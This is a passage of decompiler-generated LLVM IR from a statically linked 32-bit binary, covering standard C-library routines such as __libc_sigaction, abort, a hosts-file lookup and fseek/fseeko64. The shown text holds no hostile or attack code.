dec_label_pc_1000dfc4.lr.ph:                      ; preds = %dec_label_pc_1000dfb0.preheader
  %v3_1000dfc4.pre = load i32, i32* @global_var_100234d8, align 4
  br label %dec_label_pc_1000dfc4

dec_label_pc_1000e1c8:                            ; preds = %dec_label_pc_1000e1a4
  %v0_1000e1c8 = load i32, i32* @r26, align 4
  store i32 %v0_1000e1c8, i32* %r3.global-to-local, align 4
  store i32 ptrtoint (i32* @global_var_1000e1d0.388 to i32), i32* @lr, align 4
  %v1_1000e1cc = inttoptr i32 %v0_1000e1c8 to i16*
  %v2_1000e1cc = call i32 @__GI_fclose(i16* %v1_1000e1cc)
  store i32 %v2_1000e1cc, i32* %r3.global-to-local, align 4
  br label %dec_label_pc_1000e1e0

dec_label_pc_1000e1d4:                            ; preds = %dec_label_pc_1000df90
  %v0_1000e1d4 = call i32 @__GI___h_errno_location()
  store i32 %v0_1000e1d4, i32* %r3.global-to-local, align 4
  %v2_1000e1dc = inttoptr i32 %v0_1000e1d4 to i32*
  store i32 3, i32* %v2_1000e1dc, align 4
  br label %dec_label_pc_1000e1e0

dec_label_pc_1000e1e0:                            ; preds = %entry, %dec_label_pc_1000e1c8, %dec_label_pc_1000e1d4
  store i32 %v2_1000df4c, i32* @r3, align 4
  %v0_1000e1e8 = call i32 @__pthread_return_void()
  store i32 %v0_1000e1e8, i32* %r3.global-to-local, align 4
  ret i32 %v0_1000e1e8

; uselistorder directives
  uselistorder i32 %v3_1000dfb04, { 2, 0, 1 }
  uselistorder i32 %v1_1000e15046, { 1, 0 }
  uselistorder i32 %v1_1000e14c45, { 1, 0 }
  uselistorder i32 %v0_1000dff8, { 1, 0 }
  uselistorder i32 %v1_1000e048, { 1, 0 }
  uselistorder i8* %v1_1000e040, { 0, 2, 1 }
  uselistorder i8 %v2_1000e010, { 2, 0, 1 }
  uselistorder i32 %v0_1000e00c, { 0, 1, 3, 2 }
  uselistorder i32 %v3_1000dfb0, { 1, 0, 2 }
  uselistorder i32 %v1_1000dfac, { 0, 2, 1 }
  uselistorder i32 %v2_1000e1a4, { 1, 3, 2, 0 }
  uselistorder i32 %v2_1000df4c, { 1, 0, 2 }
  uselistorder i32 %tmp, { 1, 0, 2 }
  uselistorder i32* %r3.global-to-local, { 2, 3, 4, 5, 1, 21, 22, 6, 7, 8, 9, 10, 11, 12, 13, 14, 15, 16, 17, 19, 20, 18, 0, 23, 24, 25, 26, 27, 28 }
  uselistorder i32* %r11.global-to-local, { 1, 2, 3, 0, 4, 5, 6, 7, 8 }
  uselistorder i32 ()* @__GI___h_errno_location, { 5, 4, 3, 2, 0, 1 }
  uselistorder i32 ()* @free, { 17, 14, 13, 12, 11, 10, 9, 8, 23, 22, 7, 6, 5, 4, 3, 16, 15, 18, 21, 20, 19, 2, 1, 0 }
  uselistorder i32* @global_var_10023580.372, { 0, 2, 3, 4, 5, 1, 6, 7, 8 }
  uselistorder i32 ptrtoint (i32* @global_var_10029868.374 to i32), { 3, 5, 1, 0, 2, 4 }
  uselistorder i32 ptrtoint (i32* @global_var_10029878.323 to i32), { 1, 0 }
  uselistorder i32 ptrtoint (i32* @global_var_10023498.321 to i32), { 0, 2, 3, 4, 1, 5 }
  uselistorder label %dec_label_pc_1000e1e0, { 2, 1, 0 }
  uselistorder label %dec_label_pc_1000e198, { 1, 0 }
  uselistorder label %dec_label_pc_1000e11c, { 1, 0 }
  uselistorder label %dec_label_pc_1000e138.preheader, { 1, 0 }
  uselistorder label %dec_label_pc_1000e0c4, { 1, 0 }
  uselistorder label %dec_label_pc_1000e080, { 1, 0, 2 }
  uselistorder label %dec_label_pc_1000e078, { 1, 0 }
  uselistorder label %dec_label_pc_1000e040, { 2, 0, 1 }
  uselistorder label %dec_label_pc_1000e010, { 1, 0 }
  uselistorder label %dec_label_pc_1000e1a4.backedge, { 4, 3, 2, 1, 7, 6, 5, 0 }
  uselistorder label %dec_label_pc_1000e1a4.preheader, { 1, 0 }
}

define i32 @__get_hosts_byname_r(i32 %arg1, i32 %arg2, i32 %arg3, i32 %arg4, i32 %arg5, i32 %arg6, i32 %arg7) local_unnamed_addr {
entry:
  %stack_var_0 = alloca i32, align 4
  %v4_1000e204 = ptrtoint i32* %stack_var_0 to i32
  store i32 %arg6, i32* @r10, align 4
  store i32 %arg5, i32* @r29, align 4
  store i32 268493380, i32* @lr, align 4
  %v9_1000e240 = inttoptr i32 %arg3 to i32*
  %v10_1000e240 = call i32 @__read_etc_hosts_r(i32 0, i32 %arg1, i32 %arg2, i32 0, i32* %v9_1000e240, i32 %arg4, i32 %arg5, i32 %v4_1000e204, i32 %arg7)
  ret i32 %v10_1000e240
}

define i32 @__libc_sigaction(i32 %arg1, i32* %arg2, i32 %arg3) local_unnamed_addr {
entry:
  %r0.global-to-local = alloca i32, align 4
  %r30.global-to-local = alloca i32, align 4
  %tmp = ptrtoint i32* %arg2 to i32
  %stack_var_-160 = alloca i32, align 4
  %stack_var_-172 = alloca i32, align 4
  %stack_var_-300 = alloca i32, align 4
  %v0_1000e25c = load i32, i32* @lr, align 4
  store i32 %v0_1000e25c, i32* %r0.global-to-local, align 4
  store i32 %tmp, i32* @r31, align 4
  %v3_1000e268 = icmp eq i32* %arg2, null
  store i32 %arg3, i32* %r30.global-to-local, align 4
  %v1_1000e278 = add i32 %tmp, 4
  store i32 %v1_1000e278, i32* @r4, align 4
  store i32 128, i32* @r5, align 4
  %v2_1000e280 = ptrtoint i32* %stack_var_-300 to i32
  store i32 %v2_1000e280, i32* @r3, align 4
  br i1 %v3_1000e268, label %dec_label_pc_1000e2a8, label %dec_label_pc_1000e288

dec_label_pc_1000e288:                            ; preds = %entry
  %v2_1000e288 = load i32, i32* %arg2, align 4
  store i32 %v2_1000e288, i32* %r0.global-to-local, align 4
  store i32 268493460, i32* @lr, align 4
  %v0_1000e290 = call i32 @memcpy()
  %v0_1000e294 = load i32, i32* @r31, align 4
  %v1_1000e294 = add i32 %v0_1000e294, 132
  %v2_1000e294 = inttoptr i32 %v1_1000e294 to i32*
  %v3_1000e294 = load i32, i32* %v2_1000e294, align 4
  store i32 %v3_1000e294, i32* %r0.global-to-local, align 4
  %v1_1000e2a0 = add i32 %v0_1000e294, 136
  %v2_1000e2a0 = inttoptr i32 %v1_1000e2a0 to i32*
  %v3_1000e2a0 = load i32, i32* %v2_1000e2a0, align 4
  store i32 %v3_1000e2a0, i32* %r0.global-to-local, align 4
  br label %dec_label_pc_1000e2a8

dec_label_pc_1000e2a8:                            ; preds = %entry, %dec_label_pc_1000e288
  store i32 268493512, i32* @lr, align 4
  %v0_1000e2c4 = call i32 @__syscall_rt_sigaction()
  %v0_1000e2c8 = load i32, i32* %r30.global-to-local, align 4
  %v3_1000e2c8 = icmp eq i32 %v0_1000e2c8, 0
  store i32 %v0_1000e2c4, i32* @r31, align 4
  br i1 %v3_1000e2c8, label %dec_label_pc_1000e304, label %dec_label_pc_1000e2d8

dec_label_pc_1000e2d8:                            ; preds = %dec_label_pc_1000e2a8
  %v1_1000e2d0 = icmp slt i32 %v0_1000e2c4, 0
  %v1_1000e2d8 = add i32 %v0_1000e2c8, 4
  store i32 %v1_1000e2d8, i32* @r3, align 4
  %v2_1000e2dc = ptrtoint i32* %stack_var_-160 to i32
  store i32 %v2_1000e2dc, i32* @r4, align 4
  store i32 128, i32* @r5, align 4
  br i1 %v1_1000e2d0, label %dec_label_pc_1000e304, label %dec_label_pc_1000e2e8

dec_label_pc_1000e2e8:                            ; preds = %dec_label_pc_1000e2d8
  %v3_1000e2e8 = load i32, i32* %stack_var_-172, align 4
  store i32 %v3_1000e2e8, i32* %r0.global-to-local, align 4
  %v2_1000e2ec = inttoptr i32 %v0_1000e2c8 to i32*
  store i32 %v3_1000e2e8, i32* %v2_1000e2ec, align 4
  store i32 268493556, i32* @lr, align 4
  %v0_1000e2f0 = call i32 @memcpy()
  %v1_1000e2fc = load i32, i32* %r30.global-to-local, align 4
  %v2_1000e2fc = add i32 %v1_1000e2fc, 136
  %v3_1000e2fc = inttoptr i32 %v2_1000e2fc to i32*
  %v0_1000e300 = load i32, i32* %r0.global-to-local, align 4
  %v1_1000e300 = load i32, i32* %r30.global-to-local, align 4
  %v2_1000e300 = add i32 %v1_1000e300, 132
  %v3_1000e300 = inttoptr i32 %v2_1000e300 to i32*
  store i32 %v0_1000e300, i32* %v3_1000e300, align 4
  %v0_1000e308.pre = load i32, i32* @r31, align 4
  br label %dec_label_pc_1000e304

dec_label_pc_1000e304:                            ; preds = %dec_label_pc_1000e2d8, %dec_label_pc_1000e2a8, %dec_label_pc_1000e2e8
  %v0_1000e308 = phi i32 [ %v0_1000e2c4, %dec_label_pc_1000e2d8 ], [ %v0_1000e2c4, %dec_label_pc_1000e2a8 ], [ %v0_1000e308.pre, %dec_label_pc_1000e2e8 ]
  store i32 %v0_1000e25c, i32* %r0.global-to-local, align 4
  ret i32 %v0_1000e308

; uselistorder directives
  uselistorder i32 %v0_1000e2c4, { 0, 1, 3, 2 }
  uselistorder i32* null, { 0, 3, 1, 2 }
  uselistorder label %dec_label_pc_1000e304, { 2, 0, 1 }
  uselistorder label %dec_label_pc_1000e2a8, { 1, 0 }
}

define i32 @abort(i32 %arg1) local_unnamed_addr {
dec_label_pc_1000e350.lr.ph:
  %ctr.global-to-local = alloca i32, align 4
  %r10.global-to-local = alloca i32, align 4
  %r11.global-to-local = alloca i32, align 4
  %r29.global-to-local = alloca i32, align 4
  %r8.global-to-local = alloca i32, align 4
  %r9.global-to-local = alloca i32, align 4
  %stack_var_-168 = alloca i32, align 4
  %stack_var_-296 = alloca i32, align 4
  %v0_1000e334 = call i32 @__pthread_return_0()
  %v2_1000e33c = ptrtoint i32* %stack_var_-296 to i32
  store i32 %v2_1000e33c, i32* %r29.global-to-local, align 4
  store i32 0, i32* %r11.global-to-local, align 4
  store i32 31, i32* %r9.global-to-local, align 4
  store i32 32, i32* %ctr.global-to-local, align 4
  %v3_1000e35433 = add i32 %v2_1000e33c, 124
  %v4_1000e35434 = inttoptr i32 %v3_1000e35433 to i32*
  store i32 0, i32* %v4_1000e35434, align 4
  %v0_1000e35835 = load i32, i32* %r9.global-to-local, align 4
  %v1_1000e35836 = add i32 %v0_1000e35835, -1
  store i32 %v1_1000e35836, i32* %r9.global-to-local, align 4
  %v0_1000e35c37 = load i32, i32* %ctr.global-to-local, align 4
  %v1_1000e35c38 = add i32 %v0_1000e35c37, -1
  store i32 %v1_1000e35c38, i32* %ctr.global-to-local, align 4
  %v2_1000e35c39 = icmp eq i32 %v1_1000e35c38, 0
  br i1 %v2_1000e35c39, label %dec_label_pc_1000e360, label %dec_label_pc_1000e350.dec_label_pc_1000e350_crit_edge

dec_label_pc_1000e350.dec_label_pc_1000e350_crit_edge: ; preds = %dec_label_pc_1000e350.lr.ph, %dec_label_pc_1000e350.dec_label_pc_1000e350_crit_edge
  %v1_1000e35840 = phi i32 [ %v1_1000e358, %dec_label_pc_1000e350.dec_label_pc_1000e350_crit_edge ], [ %v1_1000e35836, %dec_label_pc_1000e350.lr.ph ]
  %v0_1000e354.pre = load i32, i32* %r11.global-to-local, align 4
  %v1_1000e354.pre = load i32, i32* %r29.global-to-local, align 4
  %v1_1000e350 = mul i32 %v1_1000e35840, 4
  %v3_1000e354 = add i32 %v1_1000e350, %v1_1000e354.pre
  %v4_1000e354 = inttoptr i32 %v3_1000e354 to i32*
  store i32 %v0_1000e354.pre, i32* %v4_1000e354, align 4
  %v0_1000e358 = load i32, i32* %r9.global-to-local, align 4
  %v1_1000e358 = add i32 %v0_1000e358, -1
  store i32 %v1_1000e358, i32* %r9.global-to-local, align 4
  %v0_1000e35c = load i32, i32* %ctr.global-to-local, align 4
  %v1_1000e35c = add i32 %v0_1000e35c, -1
  store i32 %v1_1000e35c, i32* %ctr.global-to-local, align 4
  %v2_1000e35c = icmp eq i32 %v1_1000e35c, 0
  br i1 %v2_1000e35c, label %dec_label_pc_1000e360, label %dec_label_pc_1000e350.dec_label_pc_1000e350_crit_edge

dec_label_pc_1000e360:                            ; preds = %dec_label_pc_1000e350.dec_label_pc_1000e350_crit_edge, %dec_label_pc_1000e350.lr.ph
  store i32 %v2_1000e33c, i32* @r3, align 4
  store i32 6, i32* @r4, align 4
  %v0_1000e368 = call i32 @__sigaddset()
  %v3_1000e36c = icmp eq i32 %v0_1000e368, 0
  br i1 %v3_1000e36c, label %dec_label_pc_1000e374, label %dec_label_pc_1000e384

dec_label_pc_1000e374:                            ; preds = %dec_label_pc_1000e360
  store i32 268493700, i32* @lr, align 4
  %v3_1000e380 = call i32 @__GI_sigprocmask(i32 1, i32 %v2_1000e33c, i32 0)
  br label %dec_label_pc_1000e384

dec_label_pc_1000e384:                            ; preds = %dec_label_pc_1000e360, %dec_label_pc_1000e374
  store i32 268566528, i32* %r9.global-to-local, align 4
  %v3_1000e388 = load i32, i32* @global_var_10023584.392, align 4
  %v3_1000e38c = icmp eq i32 %v3_1000e388, 0
  br i1 %v3_1000e38c, label %dec_label_pc_1000e394, label %dec_label_pc_1000e3bc

dec_label_pc_1000e394:                            ; preds = %dec_label_pc_1000e384
  store i32 1, i32* @global_var_10023584.392, align 4
  br label %dec_label_pc_1000e39c

dec_label_pc_1000e39c:                            ; preds = %dec_label_pc_1000e418, %dec_label_pc_1000e394
  store i32 ptrtoint (i32* @global_var_100234b0.390 to i32), i32* %r29.global-to-local, align 4
  %v0_1000e3a8 = call i32 @__pthread_return_0()
  store i32 268493748, i32* @lr, align 4
  %v1_1000e3b0 = call i32 @__raise(i32 6)
  %v0_1000e3b8 = call i32 @__pthread_return_0()
  %v3_1000e3c0.pre = load i32, i32* @global_var_10023584.392, align 4
  br label %dec_label_pc_1000e3bc

dec_label_pc_1000e3bc:                            ; preds = %dec_label_pc_1000e384, %dec_label_pc_1000e39c
  %v0_1000e434 = phi i32 [ %v3_1000e388, %dec_label_pc_1000e384 ], [ %v3_1000e3c0.pre, %dec_label_pc_1000e39c ]
  store i32 268566528, i32* %r9.global-to-local, align 4
  %v3_1000e3c4 = icmp eq i32 %v0_1000e434, 1
  br i1 %v3_1000e3c4, label %dec_label_pc_1000e404.lr.ph, label %dec_label_pc_1000e434

dec_label_pc_1000e404.lr.ph:                      ; preds = %dec_label_pc_1000e3bc
  %v2_1000e3d0 = ptrtoint i32* %stack_var_-168 to i32
  store i32 2, i32* @global_var_10023584.392, align 4
  store i32 ptrtoint (i32* @global_var_1000e3e4.394 to i32), i32* @lr, align 4
  %v3_1000e3e0 = call i32 @__GI_memset(i32 %v2_1000e3d0, i32 0, i32 140)
  store i32 %v2_1000e33c, i32* %r8.global-to-local, align 4
  store i32 -1, i32* %r10.global-to-local, align 4
  store i32 0, i32* %stack_var_-168, align 4
  store i32 31, i32* %r11.global-to-local, align 4
  store i32 32, i32* %ctr.global-to-local, align 4
  store i32 %v3_1000e35433, i32* %r9.global-to-local, align 4
  %v2_1000e40c25 = add i32 %v2_1000e33c, 256
  %v3_1000e40c26 = inttoptr i32 %v2_1000e40c25 to i32*
  store i32 -1, i32* %v3_1000e40c26, align 4
  %v0_1000e41027 = load i32, i32* %r11.global-to-local, align 4
  %v1_1000e41028 = add i32 %v0_1000e41027, -1
  store i32 %v1_1000e41028, i32* %r11.global-to-local, align 4
  %v0_1000e41429 = load i32, i32* %ctr.global-to-local, align 4
  %v1_1000e41430 = add i32 %v0_1000e41429, -1
  store i32 %v1_1000e41430, i32* %ctr.global-to-local, align 4
  %v2_1000e41431 = icmp eq i32 %v1_1000e41430, 0
  br i1 %v2_1000e41431, label %dec_label_pc_1000e418, label %dec_label_pc_1000e404.dec_label_pc_1000e404_crit_edge

dec_label_pc_1000e404.dec_label_pc_1000e404_crit_edge: ; preds = %dec_label_pc_1000e404.lr.ph, %dec_label_pc_1000e404.dec_label_pc_1000e404_crit_edge
  %v1_1000e41032 = phi i32 [ %v1_1000e410, %dec_label_pc_1000e404.dec_label_pc_1000e404_crit_edge ], [ %v1_1000e41028, %dec_label_pc_1000e404.lr.ph ]
  %v1_1000e408.pre = load i32, i32* %r8.global-to-local, align 4
  %v0_1000e40c.pre = load i32, i32* %r10.global-to-local, align 4
  %v1_1000e404 = mul i32 %v1_1000e41032, 4
  %v2_1000e408 = add i32 %v1_1000e404, %v1_1000e408.pre
  store i32 %v2_1000e408, i32* %r9.global-to-local, align 4
  %v2_1000e40c = add i32 %v2_1000e408, 132
  %v3_1000e40c = inttoptr i32 %v2_1000e40c to i32*
  store i32 %v0_1000e40c.pre, i32* %v3_1000e40c, align 4
  %v0_1000e410 = load i32, i32* %r11.global-to-local, align 4
  %v1_1000e410 = add i32 %v0_1000e410, -1
  store i32 %v1_1000e410, i32* %r11.global-to-local, align 4
  %v0_1000e414 = load i32, i32* %ctr.global-to-local, align 4
  %v1_1000e414 = add i32 %v0_1000e414, -1
  store i32 %v1_1000e414, i32* %ctr.global-to-local, align 4
  %v2_1000e414 = icmp eq i32 %v1_1000e414, 0
  br i1 %v2_1000e414, label %dec_label_pc_1000e418, label %dec_label_pc_1000e404.dec_label_pc_1000e404_crit_edge

dec_label_pc_1000e418:                            ; preds = %dec_label_pc_1000e404.dec_label_pc_1000e404_crit_edge, %dec_label_pc_1000e404.lr.ph
  store i32 268493872, i32* @lr, align 4
  %v4_1000e42c = call i32 @__libc_sigaction(i32 6, i32* nonnull %stack_var_-168, i32 0)
  br label %dec_label_pc_1000e39c

dec_label_pc_1000e434:                            ; preds = %dec_label_pc_1000e3bc
  %v3_1000e434 = icmp eq i32 %v0_1000e434, 2
  br i1 %v3_1000e434, label %dec_label_pc_1000e43c, label %dec_label_pc_1000e448

dec_label_pc_1000e43c:                            ; preds = %dec_label_pc_1000e434
  store i32 3, i32* @global_var_10023584.392, align 4
  br label %dec_label_pc_1000e448

dec_label_pc_1000e448:                            ; preds = %dec_label_pc_1000e434, %dec_label_pc_1000e43c
  %v3_1000e448 = phi i32 [ %v0_1000e434, %dec_label_pc_1000e434 ], [ 3, %dec_label_pc_1000e43c ]
  %v1_1000e450 = icmp ne i32 %v3_1000e448, 3
  call void @__pseudo_cond_branch(i1 %v1_1000e450, i32 268493924)
  store i32 4, i32* @global_var_10023584.392, align 4
  %v1_1000e460 = call i32 @__GI__exit(i32 127)
  ret i32 %v1_1000e460

; uselistorder directives
  uselistorder i32 %v1_1000e414, { 1, 0 }
  uselistorder i32 %v1_1000e410, { 1, 0 }
  uselistorder i32 %v1_1000e35c, { 1, 0 }
  uselistorder i32 %v1_1000e358, { 1, 0 }
  uselistorder i32 %v2_1000e33c, { 0, 2, 3, 4, 1, 5 }
  uselistorder i32* %r9.global-to-local, { 4, 0, 5, 6, 8, 7, 1, 2, 3 }
  uselistorder i32* %r11.global-to-local, { 4, 3, 0, 1, 2, 5, 6 }
  uselistorder i32* %ctr.global-to-local, { 7, 6, 0, 4, 5, 9, 8, 1, 2, 3 }
  uselistorder i32 (i32)* @__GI__exit, { 1, 0, 10, 9, 8, 7, 5, 4, 3, 6, 2 }
  uselistorder i32 127, { 1, 4, 0, 3, 5, 2 }
  uselistorder i32 (i32, i32*, i32)* @__libc_sigaction, { 2, 0, 1 }
  uselistorder i32 132, { 3, 1, 2, 0 }
  uselistorder i32* @global_var_10023584.392, { 1, 2, 3, 0, 4, 5 }
  uselistorder i32 268566528, { 19, 20, 0, 15, 1, 24, 3, 2, 7, 4, 18, 16, 17, 10, 11, 12, 9, 21, 22, 23, 13, 14, 5, 8, 6 }
  uselistorder i32 (i32, i32, i32)* @__GI_sigprocmask, { 0, 6, 5, 4, 3, 2, 1 }
  uselistorder i32 ()* @__sigaddset, { 0, 4, 3, 2, 1 }
  uselistorder label %dec_label_pc_1000e448, { 1, 0 }
  uselistorder label %dec_label_pc_1000e404.dec_label_pc_1000e404_crit_edge, { 1, 0 }
  uselistorder label %dec_label_pc_1000e3bc, { 1, 0 }
  uselistorder label %dec_label_pc_1000e384, { 1, 0 }
  uselistorder label %dec_label_pc_1000e350.dec_label_pc_1000e350_crit_edge, { 1, 0 }
}

define i32 @_dl_aux_init(i32 %arg1) local_unnamed_addr {
entry:
  %v1_1000e46c = add i32 %arg1, 28
  %v2_1000e46c = inttoptr i32 %v1_1000e46c to i32*
  %v3_1000e46c = load i32, i32* %v2_1000e46c, align 4
  store i32 %v3_1000e46c, i32* @global_var_10023588.395, align 4
  %v1_1000e47c = add i32 %arg1, 44
  %v2_1000e47c = inttoptr i32 %v1_1000e47c to i32*
  %v3_1000e47c = load i32, i32* %v2_1000e47c, align 4
  store i32 %v3_1000e47c, i32* @global_var_1002358c.396, align 4
  ret i32 %arg1

; uselistorder directives
  uselistorder i32 %arg1, { 1, 0, 2 }
}

define i32 @__GI_brk(i32 %arg1) local_unnamed_addr {
entry:
  store i32 %arg1, i32* @global_var_10023590.359, align 4
  %v0_1000e4b0 = load i32, i32* @lr, align 4
  call void @__pseudo_cond_branch(i1 true, i32 %v0_1000e4b0)
  store i32 12, i32* @r3, align 4
  %v0_1000e4b8 = call i32 @__syscall_error()
  ret i32 %v0_1000e4b8

; uselistorder directives
  uselistorder i32* @global_var_10023590.359, { 1, 0, 2 }
}

define i32 @__syscall_rt_sigaction() local_unnamed_addr {
entry:
  %r31.global-to-local = alloca i32, align 4
  %v0_1000e4d4 = call i32 @__asm_mfcr()
  %v1_1000e4d8 = and i32 %v0_1000e4d4, 268435456
  %v3_1000e4d8 = icmp eq i32 %v1_1000e4d8, 0
  store i32 %v0_1000e4d4, i32* %r31.global-to-local, align 4
  br i1 %v3_1000e4d8, label %dec_label_pc_1000e4f0, label %dec_label_pc_1000e4e4

dec_label_pc_1000e4e4:                            ; preds = %entry
  %v0_1000e4e4 = call i32 @__errno_location()
  %v0_1000e4e8 = load i32, i32* %r31.global-to-local, align 4
  %v2_1000e4e8 = inttoptr i32 %v0_1000e4e4 to i32*
  store i32 %v0_1000e4e8, i32* %v2_1000e4e8, align 4
  br label %dec_label_pc_1000e4f0

dec_label_pc_1000e4f0:                            ; preds = %entry, %dec_label_pc_1000e4e4
  %v0_1000e500 = phi i32 [ %v0_1000e4d4, %entry ], [ -1, %dec_label_pc_1000e4e4 ]
  ret i32 %v0_1000e500

; uselistorder directives
  uselistorder label %dec_label_pc_1000e4f0, { 1, 0 }
}

define i32 @__libc_poll(i32 %arg1, i32 %arg2, i32 %arg3) local_unnamed_addr {
entry:
  %r31.global-to-local = alloca i32, align 4
  %v0_1000e51c = call i32 @__asm_mfcr()
  %v1_1000e520 = and i32 %v0_1000e51c, 268435456
  %v3_1000e520 = icmp eq i32 %v1_1000e520, 0
  store i32 %v0_1000e51c, i32* %r31.global-to-local, align 4
  br i1 %v3_1000e520, label %dec_label_pc_1000e538, label %dec_label_pc_1000e52c

dec_label_pc_1000e52c:                            ; preds = %entry
  %v0_1000e52c = call i32 @__errno_location()
  %v0_1000e530 = load i32, i32* %r31.global-to-local, align 4
  %v2_1000e530 = inttoptr i32 %v0_1000e52c to i32*
  store i32 %v0_1000e530, i32* %v2_1000e530, align 4
  br label %dec_label_pc_1000e538

dec_label_pc_1000e538:                            ; preds = %entry, %dec_label_pc_1000e52c
  %v0_1000e548 = phi i32 [ %v0_1000e51c, %entry ], [ -1, %dec_label_pc_1000e52c ]
  ret i32 %v0_1000e548

; uselistorder directives
  uselistorder label %dec_label_pc_1000e538, { 1, 0 }
}

define i32 @__GI_fseek(i32 %arg1) local_unnamed_addr {
entry:
  %v0_1000e54c = load i32, i32* @r5, align 4
  store i32 %v0_1000e54c, i32* @r7, align 4
  %tmp = icmp slt i32 %arg1, 0
  %v1_1000e554 = zext i1 %tmp to i32
  %v2_1000e554 = ashr i32 %arg1, 31
  %v3_1000e554 = and i32 %v2_1000e554, -2
  %v4_1000e554 = or i32 %v3_1000e554, %v1_1000e554
  %v3_1000e558 = inttoptr i32 %v4_1000e554 to i16*
  %v4_1000e558 = call i32 @__GI_fseeko64(i16* %v3_1000e558, i32 %arg1, i32 %v0_1000e54c)
  ret i32 %v4_1000e558

; uselistorder directives
  uselistorder i32 %arg1, { 1, 2, 0 }
}

define i32 @__GI_fseeko64(i16* %arg1, i32 %arg2, i32 %arg3) local_unnamed_addr {
entry:
  %r0.global-to-local = alloca i32, align 4
  %r11.global-to-local = alloca i32, align 4
  %r9.global-to-local = alloca i32, align 4
  %tmp = ptrtoint i16* %arg1 to i32
  %stack_var_-56 = alloca i32, align 4
  %stack_var_-48 = alloca i32, align 4
  %v0_1000e55c = load i32, i32* @r7, align 4
  %v0_1000e560 = load i32, i32* @lr, align 4
  store i32 %v0_1000e560, i32* %r0.global-to-local, align 4
  store i32 %v0_1000e55c, i32* @r30, align 4
  store i32 %tmp, i32* @r31, align 4
  store i32 %arg2, i32* %stack_var_-56, align 4
  %tmp9 = icmp ult i32 %v0_1000e55c, 3
  br i1 %tmp9, label %dec_label_pc_1000e598, label %dec_label_pc_1000e584

dec_label_pc_1000e584:                            ; preds = %entry
  %v0_1000e584 = call i32 @__errno_location()
  store i32 -1, i32* @r30, align 4
  store i32 22, i32* %r0.global-to-local, align 4
  %v2_1000e590 = inttoptr i32 %v0_1000e584 to i32*
  store i32 22, i32* %v2_1000e590, align 4
  br label %dec_label_pc_1000e660

dec_label_pc_1000e598:                            ; preds = %entry
  %v2_1000e598 = add i32 %tmp, 52
  %v3_1000e598 = inttoptr i32 %v2_1000e598 to i32*
  %v4_1000e598 = load i32, i32* %v3_1000e598, align 4
  store i32 %v4_1000e598, i32* @r28, align 4
  %v3_1000e59c = icmp eq i32 %v4_1000e598, 0
  br i1 %v3_1000e59c, label %dec_label_pc_1000e5a4, label %dec_label_pc_1000e5c4

dec_label_pc_1000e5a4:                            ; preds = %dec_label_pc_1000e598
  %v2_1000e5a4 = add i32 %tmp, 56
  store i32 %v2_1000e5a4, i32* @r29, align 4
  %v2_1000e5ac = ptrtoint i32* %stack_var_-48 to i32
  store i32 %v2_1000e5ac, i32* @r3, align 4
  %v0_1000e5b8 = call i32 @__pthread_return_void()
  %v0_1000e5c0 = call i32 @__pthread_return_0()
  %v0_1000e5c4.pre = load i32, i32* @r31, align 4
  br label %dec_label_pc_1000e5c4

dec_label_pc_1000e5c4:                            ; preds = %dec_label_pc_1000e598, %dec_label_pc_1000e5a4
  %v0_1000e5d0 = phi i32 [ %tmp, %dec_label_pc_1000e598 ], [ %v0_1000e5c4.pre, %dec_label_pc_1000e5a4 ]
  %v1_1000e5c4 = inttoptr i32 %v0_1000e5d0 to i16*
  %v2_1000e5c4 = load i16, i16* %v1_1000e5c4, align 2
  %v3_1000e5c4 = zext i16 %v2_1000e5c4 to i32
  store i32 %v3_1000e5c4, i32* %r0.global-to-local, align 4
  %v1_1000e5c8 = and i32 %v3_1000e5c4, 64
  store i32 %v1_1000e5c8, i32* %r9.global-to-local, align 4
  %v3_1000e5c8 = icmp eq i32 %v1_1000e5c8, 0
  br i1 %v3_1000e5c8, label %dec_label_pc_1000e5e0, label %dec_label_pc_1000e5d0

dec_label_pc_1000e5d0:                            ; preds = %dec_label_pc_1000e5c4
  store i32 %v0_1000e5d0, i32* @r3, align 4
  store i32 268494296, i32* @lr, align 4
  %v0_1000e5d4 = call i32 @__stdio_wcommit()
  %v3_1000e5d8 = icmp eq i32 %v0_1000e5d4, 0
  br i1 %v3_1000e5d8, label %dec_label_pc_1000e5e0, label %dec_label_pc_1000e648

dec_label_pc_1000e5e0:                            ; preds = %dec_label_pc_1000e5d0, %dec_label_pc_1000e5c4
  %v0_1000e5e0 = load i32, i32* @r30, align 4
  %v3_1000e5e0 = icmp eq i32 %v0_1000e5e0, 1
  br i1 %v3_1000e5e0, label %dec_label_pc_1000e5e8, label %dec_label_pc_1000e5e0.dec_label_pc_1000e5fc_crit_edge

dec_label_pc_1000e5e0.dec_label_pc_1000e5fc_crit_edge: ; preds = %dec_label_pc_1000e5e0
  br label %dec_label_pc_1000e5fc

dec_label_pc_1000e5e8:                            ; preds = %dec_label_pc_1000e5e0
  %v0_1000e5e8 = load i32, i32* @r31, align 4
  %v1_1000e5e8 = inttoptr i32 %v0_1000e5e8 to i16*
  %v2_1000e5ec = ptrtoint i32* %stack_var_-56 to i32
  store i32 268494324, i32* @lr, align 4
  %v4_1000e5f0 = call i32 @__stdio_adjust_position(i16* %v1_1000e5e8, i32 %v2_1000e5ec)
  %v1_1000e5f4 = icmp slt i32 %v4_1000e5f0, 0
  br i1 %v1_1000e5f4, label %dec_label_pc_1000e648, label %dec_label_pc_1000e5e8.dec_label_pc_1000e5fc_crit_edge

dec_label_pc_1000e5e8.dec_label_pc_1000e5fc_crit_edge: ; preds = %dec_label_pc_1000e5e8
  %v0_1000e5fc.pre = load i32, i32* @r30, align 4
  br label %dec_label_pc_1000e5fc

dec_label_pc_1000e5fc:                            ; preds = %dec_label_pc_1000e5e0.dec_label_pc_1000e5fc_crit_edge, %dec_label_pc_1000e5e8.dec_label_pc_1000e5fc_crit_edge
  %v0_1000e5fc = phi i32 [ %v0_1000e5e0, %dec_label_pc_1000e5e0.dec_label_pc_1000e5fc_crit_edge ], [ %v0_1000e5fc.pre, %dec_label_pc_1000e5e8.dec_label_pc_1000e5fc_crit_edge ]
  %v0_1000e600 = load i32, i32* @r31, align 4
  store i32 268494348, i32* @lr, align 4
  %v5_1000e608 = call i32 @__stdio_seek(i32 %v0_1000e600, i32* nonnull %stack_var_-56, i32 %v0_1000e5fc)
  %v1_1000e60c = icmp slt i32 %v5_1000e608, 0
  br i1 %v1_1000e60c, label %dec_label_pc_1000e648, label %dec_label_pc_1000e614

dec_label_pc_1000e614:                            ; preds = %dec_label_pc_1000e5fc
  %v0_1000e614 = load i32, i32* @r31, align 4
  %v1_1000e614 = inttoptr i32 %v0_1000e614 to i16*
